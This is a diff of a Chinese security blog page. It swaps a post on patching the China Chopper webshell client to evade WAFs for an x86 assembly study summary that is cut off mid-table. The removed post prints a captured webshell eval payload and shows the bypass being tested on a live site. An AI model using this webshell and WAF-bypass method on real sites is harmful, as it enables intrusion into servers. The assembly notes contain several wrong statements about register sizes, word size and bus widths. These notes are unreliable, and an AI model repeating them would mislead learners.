@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>Bypass菜刀进化成过Waf刀 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="Bypass菜刀进化成过Waf刀 | 九世的博客">
+  <title>汇编学习总结 | 九世的博客</title>
+  <meta name="keywords" content=" 底层 ">
+  <meta name="description" content="汇编学习总结 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1475,9 +1475,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-Bypass菜刀进化成过Waf刀" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-汇编学习总结" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">Bypass菜刀进化成过Waf刀</h1>
+        <h1 class="article-title">汇编学习总结</h1>
     
     <div class="article-meta">
         
@@ -1486,14 +1486,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color3">底层</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2018-08-21 15:18</time>
+        创建时间:<time class="date" title="更新时间: 2020-09-21 23:22:34">2020-09-21 19:20</time>
         
     </div>
     <div class="article-meta">
@@ -1515,7 +1515,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#正文："><span class="toc-text">正文：</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#简介"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x86的历史"><span class="toc-text">x86的历史</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#x64-x86"><span class="toc-text">x64-x86</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#高等语言的执行过程"><span class="toc-text">高等语言的执行过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#汇编语言的组成"><span class="toc-text">汇编语言的组成</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基础"><span class="toc-text">基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#寄存器"><span class="toc-text">寄存器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#寄存器的大小和计算"><span class="toc-text">寄存器的大小和计算</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#寄存器分类"><span class="toc-text">寄存器分类</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#物理地址"><span class="toc-text">物理地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#寻址"><span class="toc-text">寻址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#指令和数据"><span class="toc-text">指令和数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内存和单元"><span class="toc-text">内存和单元</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常见的容量单位"><span class="toc-text">常见的容量单位</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内存地址空间"><span class="toc-text">内存地址空间</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编写汇编的工具"><span class="toc-text">编写汇编的工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常见的汇编格式"><span class="toc-text">常见的汇编格式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#汇编程序编译"><span class="toc-text">汇编程序编译</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常见的汇编指令"><span class="toc-text">常见的汇编指令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题外话"><span class="toc-text">题外话</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1530,23 +1530,206 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首先我要在这里大肆吐槽，今天的底层软件好像都在刁难我。首先是用UPX脱壳工具<br>把菜刀脱坏掉了，然后重新下一个。在换一个脱没毛病，用C32asm进行字符替换的时候不给我替换。我特么。。。后面还是用Hxdx64进行替换的，我也是醉了。</p>
-<p><img src="https://i.imgur.com/rPw2ac5.jpg" alt=""></p>
-<pre><code>正式进入贪婪之岛篇！
-</code></pre><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><pre><code>bypass菜刀教程：https://github.com/admintony/BypassCaiDao
-</code></pre><p>首先你要有把2010年的菜刀，因为16年的菜刀的数据包不同，然后你还需要一些底层工具。</p>
-<pre><code>2010菜刀：链接: https://pan.baidu.com/s/1jvECLJjpsh4OsclZFHkv8g 密码: 6n1h
-吾爱破解工具包：链接：https://pan.baidu.com/s/1nwJg0eX  密码: iuj3
-WSExplorer抓包工具：https://blog.mycike.com/154.html
-</code></pre><p>我们首先把菜刀的UPX壳给脱了，这里我就不说了。自己脱掉就行<br><img src="https://i.imgur.com/m4Tcb1Z.png" alt=""><br>脱壳：</p>
-<p><img src="https://i.imgur.com/993lYUE.png" alt=""></p>
-<p>然后我们启动WSExplorer抓包工具，选择菜刀想进程进行抓包（用菜刀连shell）<br><img src="https://i.imgur.com/FxN5FLd.png" alt=""><br>然后我们可以看到图上抓到的包</p>
-<pre><code>x=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7ZWNobyAkRC4iXHQiO2lmKHN1YnN0cigkRCwwLDEpIT0iLyIpe2ZvcmVhY2gocmFuZ2UoIkEiLCJaIikgYXMgJEwpaWYoaXNfZGlyKCRMLiI6IikpZWNobygkTC4iOiIpO307ZWNobygifDwtIik7ZGllKCk7
-</code></pre><p>这里引用文章的解释：</p>
-<pre><code>x 是shell的密码，其中的数据是让shell再接收一个z0
-z0 中存放着执行命令，列目录，修改文件等操作的PHP代码,并试用base64加密数据.
-</code></pre><p>然后文章把User-Agent头也改了，这里我就不改了。因为我获取了文件偏移地址但不会转为内存偏移地址（手动滑稽）</p>
-<p>我们直接修改第一个参数数据：<br>首先用C32asm搜索：@eval(base64_decode($<em>POST[z0])); 替换成Dizep,fewi:8chigshi,(cTSWX</em>~4a–?（我这里的C32asm刁难我）<br><img src="https://i.imgur.com/67Pzx2W.png" alt=""><br>用HxDx64来替换<br><img src="https://i.imgur.com/dvYLN4b.jpg" alt=""><br>然后找一个有waf的站来测试，就用我之前过安全狗文件上传的那个站吧<br><img src="https://i.imgur.com/801VXaI.png" alt=""><br>（如果用普通的刀和一句话连的话和上图一样）<br><img src="https://i.imgur.com/eqR09oE.png" alt=""><br>转载请注明转自：422926799.github.io</p>
+        <p>好久没看汇编了，怕忘。复习一下顺便写一下总结</p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
+<p>汇编语言（Assembly Language）是任何一种用于电子计算机、微处理器、微控制器或其他可编程器件的低级语言，亦称为符号语言。在汇编语言中，用助记符代替机器指令的操作码，用地址符号或标号代替指令或操作数的地址。在不同的设备中，汇编语言对应着不同的机器语言指令集，通过汇编过程转换成机器指令。特定的汇编语言和特定的机器语言指令集是一一对应的，不同平台之间不可直接移植</p>
+</blockquote>
+<p>一个CPU的构成，简单的来说：</p>
+<ul>
+<li>汇编架构</li>
+<li>CPU厂家自身的指令</li>
+</ul>
+<p>常见的汇编架构：</p>
+<ul>
+<li>X86</li>
+<li>ARM</li>
+<li>MIPS</li>
+<li>AVR<br>……</li>
+</ul>
+<p>每一个汇编架构的指令都有所不同，这里主要是x86框架的指令。</p>
+<h2 id="x86的历史"><a href="#x86的历史" class="headerlink" title="x86的历史"></a>x86的历史</h2><blockquote>
+<p>1978年6月8日，Intel发布了新款16位微处理器“8086”，也同时开创了一个新时代：x86架构诞生了。x86指的是特定微处理器执行的一些计算机语言指令集，定义了芯片的基本使用规则，一如今天的x64、IA64等。</p>
+</blockquote>
+<blockquote>
+<p>86指令集是美国Intel公司为其第一块16位CPU(i8086)专门开发的，美国IBM公司1981年推出的世界第一台PC机中的CPU–i8088(i8086简化版)使用的也是X86指令，同时电脑中为提高浮点数据处理能力而增加的X87芯片系列数学协处理器则另外使用X87指令，以后就将X86指令集和X87指令集统称为X86指令集。虽然随着CPU技术的不断发展，Intel陆续研制出更新型的i80386、i80486直到今天的Pentium 4(以下简为P4)系列，但为了保证电脑能继续运行以往开发的各类应用程序以保护和继承丰富的软件资源，所以Intel公司所生产的所有CPU仍然继续使用X86指令集，所以它的CPU仍属于X86系列。</p>
+</blockquote>
+<h3 id="x64-x86"><a href="#x64-x86" class="headerlink" title="x64-x86"></a>x64-x86</h3><blockquote>
+<p>x86-64（ 又称x64，即英文词64-bit extended，64位拓展 的简写）是<strong>x86架构</strong>的64位拓展，向后兼容于16位及32位的x86架构。x64于1999年由AMD设计，AMD首次公开64位集以扩展给x86，称为“AMD64”。其后也为英特尔所采用，现时英特尔称之为“Intel 64”，在之前曾使用过“Clackamas Technology” (CT)、“IA-32e”及“EM64T”。<br>苹果公司和RPM包管理员以“x86-64”或“x86_64”称呼此64位架构。甲骨文公司及Microsoft称之为“x64”。BSD家族及其他Linux发行版则使用“x64-64”，32位版本则称为“i386”（或 i486/586/686），Arch Linux用x86_64称呼此64位架构。</p>
+</blockquote>
+<h2 id="高等语言的执行过程"><a href="#高等语言的执行过程" class="headerlink" title="高等语言的执行过程"></a>高等语言的执行过程</h2><p>C:<br>编译好的程序-&gt;汇编-&gt;指令</p>
+<p>越高级的语言执行过程越慢，但是处理好的另说</p>
+<h2 id="汇编语言的组成"><a href="#汇编语言的组成" class="headerlink" title="汇编语言的组成"></a>汇编语言的组成</h2><p>汇编指令： 机器码的助记符，有对应的机器码<br>伪指令：没有对应的机器码，由编译器执行，计算机并不执行<br>其他符号：+、-、<code>*</code>、/等，由编译器识别，没有对应的机器码</p>
+<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>CPU:<br>CPU是计算机的核心部件，控制整个计算机的工作。让一个CPU工作 必须向CPU提供指令和数据，指令和数据在存储器中存放（平时说的内存） 磁盘不同内存，磁盘上的数据或程序不读到内存中就无法被CPU使用。</p>
+<p>控制器：控制器控制各种器件进行工作<br>运算器：运算器进行信息处理</p>
+<p>（以16位CPU举例）<br>CPU的总线：</p>
+<ul>
+<li><p>地址总线：用于寻找地址，然后给出内存地址</p>
+<ul>
+<li>地址总线寻址能力的计算公式：2x地址总线数量根=数据总线宽度 </li>
+</ul>
+</li>
+<li><p>数据总线：用于传输数据</p>
+<ul>
+<li>CPU的读写根据总线进行操作<br>8根数据总线一次可以传送一个8位二进制数据 16位数据总线一次可以传送两个8位二进制数据 32位数据总线一次可以传送三个8位二进制数</li>
+</ul>
+</li>
+<li><p>控制总线：用于控制CPU之外的物理设备<br>用于控制CPU之外的物理设备，所谓的内存读写都是由控制线操控并发送 其中一根负责：读信号输出，控制CPU向外传送读信号 另外一根负责：写信号输出，控制CPU向外传送写信号<br>PCIE、PCIEX、PCIEX6之类接口外部设备的数据传输</p>
+</li>
+</ul>
+<p>几位的CPU一次可以传输对应位数的数据 <em> 16位CPU一次性可以处理16位的数据 </em> 寄存器的最大宽度为16位 * CPU和寄存器之间通路是16位    </p>
+<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>寄存器是干啥的：寄存器信息存储<br>不同的CPU、寄存器的数量和结构都不同</p>
+<p>通用寄存器：</p>
+<ul>
+<li>16位CPU：AX、BX、CX、DX</li>
+<li>x86：EAX、EBX、ECX、EDX</li>
+<li>x64：RAX、RBX、RCX、RDX</li>
+</ul>
+<p>寄存器的高低位：<br>示例-&gt;<br>16位：AX 高：AH 低：AL<br>32位：EAX 高：AX 低:AH<br>64位：RAX 高:EAX 低：AX</p>
+<p>高低位的存储:</p>
+<pre><code>mov ah,64H
+</code></pre><p>此时AX：6400<br>AH:64 AL:00</p>
+<p>兼容性:<br>高位寄存器会兼容低位寄存器，例如一个16位寄存器的由两个 8位寄存器组成，则32位寄存器由一个16位寄存器和一个高8位寄存器组成（EAX由：AX和AH组成）。</p>
+<h3 id="寄存器的大小和计算"><a href="#寄存器的大小和计算" class="headerlink" title="寄存器的大小和计算"></a>寄存器的大小和计算</h3><p>一个16位寄存器只能存放4个字节 一个32位寄存器只能存放8个字节 一个64位寄存器只能存放16个字节<br>传输问题：<br>字单位：word<br>一个字等于两个字节：1 word=2B<br>8位寄存器传输一个字要传输两次，16位寄存器只需要传输一次<br>一个字在16位寄存器中，自然就存在这个寄存器中的高8位寄存器和低8位寄存器</p>
+<p>寄存器的范围:</p>
+<pre><code>16位寄存器的范围：0000~FFFF
+32位寄存器的范围：00000000~FFFFFFFF
+64位寄存器的范围：0000000000000000~FFFFFFFFFFFFFFFF
+</code></pre><p>常见的计算：</p>
+<pre><code>mov eax, 4C0H
+mov ebx, 26CH
+add eax, ebx
+mov data,
+</code></pre><p>结果位：0000072C<br><img src="https://s1.ax1x.com/2020/09/21/wqkGqA.png" alt=""></p>
+<p>如果计算超过最大范围：<br>8位寄存器计算</p>
+<pre><code> MOV AL,96h
+ MOV BH,99h
+ add AL,BH
+</code></pre><p>结果为：12F,由于8位寄存器只能放两个字节。所以舍弃到前一位字节，最后AL=2F<br>如果计算范围超过寄存器接受最大范围从左往右舍弃，直到可以接受的范围<br><img src="https://s1.ax1x.com/2020/09/21/wqEqgO.png" alt=""></p>
+<h3 id="寄存器分类"><a href="#寄存器分类" class="headerlink" title="寄存器分类"></a>寄存器分类</h3><p>寄存器分为：</p>
+<ul>
+<li>段寄存器</li>
+<li>常用寄存器</li>
+<li>特殊寄存器</li>
+</ul>
+<p>通用寄存器说明:</p>
+<ul>
+<li>AX累加器</li>
+<li>CX循环次数</li>
+<li>DX除法计算存储器</li>
+<li>BX乘法计算存储器</li>
+</ul>
+<p>段寄存器:</p>
+<ul>
+<li><p>CS:IP</p>
+<ul>
+<li>通过CS：IP寻找存放的指令</li>
+<li>CS为段地址，IP为偏移地址</li>
+<li>每次执行一条指令IP+3</li>
+<li>计算物理地址公式： 物理地址=段地址x10（十六进制的10即为十进制的16）+偏移地址</li>
+</ul>
+</li>
+<li><p>DS:IP</p>
+<ul>
+<li>通过DS：IP寻找存放的数据</li>
+<li>DS为段地址，IP为偏移地址</li>
+</ul>
+</li>
+<li><p>SS:SP</p>
+<ul>
+<li>SS：SP放着栈段的内存地址</li>
+<li>SS为段地址，SP为偏移地址</li>
+</ul>
+</li>
+<li><p>DS:SI</p>
+<ul>
+<li>相对基址变址寻址</li>
+</ul>
+</li>
+<li><p>DSI:DI</p>
+<ul>
+<li>相对基址变址寻址</li>
+</ul>
+</li>
+<li><p>ES:IP</p>
+<ul>
+<li>扩展寄存器，附加段寄存器ES：存放当前执行程序中一个辅助数据段的段地址。 段寄存器 偏移地址寄存器</li>
+</ul>
+</li>
+</ul>
+<h2 id="物理地址"><a href="#物理地址" class="headerlink" title="物理地址"></a>物理地址</h2><p>CPU访问内存单元时，要给出内存单元的地址。所以的内存单元构成的存储空间是一个以维的线性空间<br>每一个内存单元在这个空间都有唯一的地址，这个唯一的地址叫物理地址</p>
+<p>CPU通过地址总线收入存储器的，必须是一个内存单元的物理地址</p>
+<p>16寻找物理地址过程如下:<br>1.CPU中的相关部件提供两个对应CPU位数的地址时，一个称为段地址，另一个称为偏移地址<br>2.段地址和偏移地址通过内部总线收送入一个称为地址加法器的部件<br>3.地址加法器将两个地址合成一个物理地址<br>4.地址加法器通过内部总线将物理地址送入输入输出控制电路<br>5.输入输出控制电路将物理地址送上地址总线<br>6.物理地址被地址总线传到存储器</p>
+<h2 id="寻址"><a href="#寻址" class="headerlink" title="寻址"></a>寻址</h2><p>8086CPU寻址如下：<br>8086CPU有20位地址总线，可以传送20位地址，达到1MB寻址能力。8086CPU又是16位结构，<br>在内部一次性处理、传输、暂存的地址都是16位。16位CPU的内部结构来看，如果将地址从内部<br>简单地发出，那么它只能送出16位的地址，寻址能力只有64KB</p>
+<p>只有16位CPU要寻址，原因:16 cpu总线20位最大1mb，但是寄存器是16位的，所以需要段寄存器来寻址，要不然只能访问640kb<br>寻址大小计算公式：2的x次方/1024</p>
+<p>32位找物理地址的方法：<br>32位CPU有32根地址线百，物理地址=<code>2**32=4294967296=4GB</code>,但是在实际应用中，PCI内存范围度占用了大量的地址范围——接近750MB，导致最后系统物理地问址只有3.25GB左右。CPU过渡到32位以后,寻址时就不答用段地址来寻址了,32位寄存器可以访问所有版的4G地址，所以你那个每个段大小的问题是没有意义权的。<br>(这里的**32，代表2的32次方)</p>
+<p>其实32位cpu照样可以使用超过4gb的内存，某种技术</p>
+<h2 id="指令和数据"><a href="#指令和数据" class="headerlink" title="指令和数据"></a>指令和数据</h2><p>指令和数据没有区别，CPU有时候把内容当做指令有时候把内容当做数据 他们都存储在内存或磁盘中。两者都是二进制</p>
+<h2 id="内存和单元"><a href="#内存和单元" class="headerlink" title="内存和单元"></a>内存和单元</h2><p>存储器被划分成若干个存储单元，每个存储单元从0开始编号。例如一个存储器有128个存储单元 编号：0到127</p>
+<h2 id="常见的容量单位"><a href="#常见的容量单位" class="headerlink" title="常见的容量单位"></a>常见的容量单位</h2><p>常见的容量单位： 1KB=1024B 1MB=1024KB 1GB=1024MB 1TB=1024GB 比特：bit 字节：byte 字：word 1byte=8bit 1word=4byte</p>
+<h2 id="内存地址空间"><a href="#内存地址空间" class="headerlink" title="内存地址空间"></a>内存地址空间</h2><p>内存地址分段</p>
+<ul>
+<li>CPU在这段地址空间中读写数据，实际上就是在相对应的物理存储器中读写数据</li>
+<li>每个物理存储器在这个逻辑存储器中占有一个地址段，即一段地址空间 （某段的地址空间代表着不同的物理设备，假设0~7FFFH空间的代表的是内存的，地址8000H~9FFFH代表的是显存的空间）（内存地址空间是根据不同系统的不同规定）</li>
+<li>（在DOS里）比较安全的一个内存段是：0:200~0:300这个内存地址是无任何数据的，相对安全</li>
+</ul>
+<p>所有的物理存储器被看作一个由若干存储单元组成的逻辑存储器</p>
+<p>物理地址：<br>CPU访问内存单元时，要给出内存单元的地址。所以的内存单元构成的存储空间是一个以维的线性空间 每一个内存单元在这个空间都有唯一的地址，这个唯一的地址叫物理地址 CPU通过地址总线收入存储器的，必须是一个内存单元的物理地址</p>
+<h2 id="编写汇编的工具"><a href="#编写汇编的工具" class="headerlink" title="编写汇编的工具"></a>编写汇编的工具</h2><ul>
+<li>Masm for Windows 集成实验环境</li>
+<li>RadASM</li>
+<li>Vs</li>
+</ul>
+<h2 id="常见的汇编格式"><a href="#常见的汇编格式" class="headerlink" title="常见的汇编格式"></a>常见的汇编格式</h2><pre><code class="asm">DATAS SEGMENT
+    ;此处输入数据段代码  
+DATAS ENDS
+
+STACKS SEGMENT
+    ;此处输入堆栈段代码
+STACKS ENDS
+
+CODES SEGMENT
+    ASSUME CS:CODES,DS:DATAS,SS:STACKS
+START:
+    MOV AL,96h
+    MOV BH,99h
+    add AL,BH
+    ;此处输入代码段代码
+    MOV AH,4CH
+    INT 21H
+CODES ENDS
+    END START
+</code></pre>
+<p>定义一个段</p>
+<pre><code>&lt;name&gt; SEGMENT 
+.....
+&lt;name&gt; ENDS
+</code></pre><p>每个编辑器的命名都有所不同，单都大致相同</p>
+<pre><code>DATAS SEGMENT
+    ;此处输入数据段代码  
+DATAS ENDS
+
+STACKS SEGMENT
+    ;此处输入堆栈段代码
+STACKS ENDS
+
+CODES SEGMENT
+    ASSUME CS:CODES,DS:DATAS,SS:STACKS
+START:
+    ;汇编指令
+CODES ENDS
+    END START
+</code></pre><h2 id="汇编程序编译"><a href="#汇编程序编译" class="headerlink" title="汇编程序编译"></a>汇编程序编译</h2><p>编译可以直接通过工具自带的编译，直接编译好exe。或者用masm进行编译<br>（工具直接编译好的结果如下）<br><img src="https://s1.ax1x.com/2020/09/21/wqU8yQ.png" alt=""></p>
+<ul>
+<li>obj文件是编译时产生的生文件（交叉引用的文件，又可以称为中间文件）</li>
+<li>lst是链接文件</li>
+<li>exe是最后编译成功产生的文件</li>
+</ul>
+<h2 id="常见的汇编指令"><a href="#常见的汇编指令" class="headerlink" title="常见的汇编指令"></a>常见的汇编指令</h2><table style="border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 186px;"><col style="width: 312px;"><col style="width: 413px;"></colgroup><tbody><tr><td style="background-color: rgb(253, 123, 57); border: 1px solid rgb(246, 84, 3); width: 186px; padding: 8px;"><div>指令</div></td><td style="background-color: rgb(253, 123, 57); border: 1px solid rgb(246, 84, 3); width: 312px; padding: 8px;"><div>功能</div></td><td style="background-color: rgb(253, 123, 57); border: 1px solid rgb(246, 84, 3); width: 413px; padding: 8px;"><div>例子</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>mov</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>赋值给寄存器</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,60 #将ax赋给ax</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>add</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>加法计算</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>add ax,ax #将ax的值加给ax=ax+ax</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>jmp</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>跳转到指定位置</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>jmp 03C82 #跳转到03C82内存地址</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>int</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>用于中断某些东西，例如int 0中断程序返回0。int 3常用于DEBUG程序，触发为3的时候会调用debug服务</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>int 3</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>inc</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>用于将目标操作数+1</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>inc ax</div><div>inc eas</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>sub</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><span style="font-size: 14px;">不带借位的减法指令</span></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>sub ax,bx #ax=ax-bx，ax减去bx的值</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>push</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>入栈</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>push AX #将ax入栈</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>pop</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>出栈</div></td><td style="width: 413px; padding: 8px; border: 1px solid;">pop ax #将栈顶的数据出栈到ax</td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>int</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>程序返回</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>int &lt;code&gt;，例如int 21H，从CPU将控制权返回给程序</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>dec</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>减一指令，用于将目标操作数减一</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>dec ax</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>dw</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>定义字型数据</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>dw 4657H,3214H,0123H</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>or</div></td><td style="width: 312px; padding: 8px; border: 1px solid;">或指令</td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>or al,423CH&nbsp;<img src="汇编指令_files/Image.png" type="image/png" data-filename="Image.png"></div><div><img src="汇编指令_files/Image [1].png" type="image/png" data-filename="Image.png"></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>db</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>定义字节型数据</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>db ‘unIX’相当于db 75H</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>ptr</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>类型临时转换，格式：[類型] ptr [寄存器或地址單元] ，指令調用的其他寄存器也要復合類型才行</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov word ptr [BX],AX</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>div、idiv（帶符號的除數）</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>除法（需要定义类型）</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>div byte ptr [BX]</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>dd</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>定义double word类型数据</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>dd 1001H</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>dup</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>定义一个范围的值</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>dd 200 dup (0)</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>lea</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>從一個有效地址取值給寄存器，只能是地址取值，不能是寄存器取值</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov bx,0002H</div><div>mov ax,4C20H</div><div>mov DS:[BX],4C20H</div><div>lea CX,DS:[BX]</div><div>;CX=4C20H</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>call</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>無條件跳轉到指令處並開始執行和jmp很像</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov eax,esp</div><div>call eax #執行eax放的棧地址</div><div><br></div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>dec</div></td><td style="width: 312px; padding: 8px; border: 1px solid;">寄存器或值減一</td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov eax,4C00178H</div><div>dec eax</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>mul、imul（帶符號的陳數）</div></td><td style="width: 312px; padding: 8px; border: 1px solid;">乘法</td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,1234H</div><div>mov bx,2H</div><div>mul bx</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>xor</div></td><td style="width: 312px; padding: 8px; border: 1px solid;">異或運算</td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,4C21H</div><div>xor ax,0</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>not</div></td><td style="width: 312px; padding: 8px; border: 1px solid;">翻轉操作數中的所有位</td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,2B3CH</div><div>not al ;AX=3C2BH</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>neg</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>求補運算</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,2B3CH</div><div>neg ax</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>shl</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>將一個寄存器或內存單元中的數據左移一位</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,2B3CH</div><div>shl al,1 ;將al中數據左移一位（1是移幾位）</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>shr</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>將一個寄存器或內存單元中的數據右移一位</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>mov ax,2B3CH</div><div>shr ah,1 ;將al中數據右移一位（1是移幾位）</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>cmp</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>對比指令</div><div>计算 操作对象1 - 操作对象2 但不保存结果，只是根据结果修改相应的标志位</div><div>（p是比较指令,cmp的功能相当于减法指令。它不保存结果，只是影响相应的标志位。其他的指令通过识别这些被影响的标志位来得知比较结果。）</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>；死循環例</div><div>@test:xor ax,ax</div><div>&nbsp;&nbsp;&nbsp;&nbsp;mov ax,100H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;mov bx,50H</div><div>&nbsp;&nbsp;&nbsp;&nbsp;cmp ax,bx</div><div>&nbsp;&nbsp;&nbsp;&nbsp;jne @test ;不等於則跳轉到test標準</div></td></tr><tr><td style="width: 186px; padding: 8px; border: 1px solid;"><div>je</div></td><td style="width: 312px; padding: 8px; border: 1px solid;"><div>相等則跳轉</div></td><td style="width: 413px; padding: 8px; border: 1px solid;"><div>@test:xor ax,ax</div><div>&nbsp;&nbsp;&nbsp;&nbsp;mov 